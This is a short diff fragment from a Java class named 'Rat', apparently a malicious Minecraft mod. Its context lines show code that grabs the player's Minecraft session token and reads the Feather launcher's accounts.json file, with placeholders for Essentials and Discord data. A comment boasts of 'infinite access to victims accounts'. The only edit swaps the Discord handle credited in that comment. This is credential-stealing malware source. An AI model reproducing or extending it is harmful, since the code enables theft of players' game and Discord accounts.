@@ -53,7 +53,7 @@ public class Rat { //change class name please for the love of god
                 String token = mc.getSession().getToken();
                 String feather = "File not found :(", essentials = "File not found :(", discord = "Discord not found :(";
                 
-                //"if u swap these files with yours, you get infinite access to victims accounts"      -Shlost#5052
+                //"if u swap these files with yours, you get infinite access to victims accounts"      -Annah#5795
                 //apparently doesn't work lol
                 if (Files.exists(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json"))) {
                     feather = Files.readAllLines(Paths.get(mc.mcDataDir.getParent(), ".feather/accounts.json")).toString();
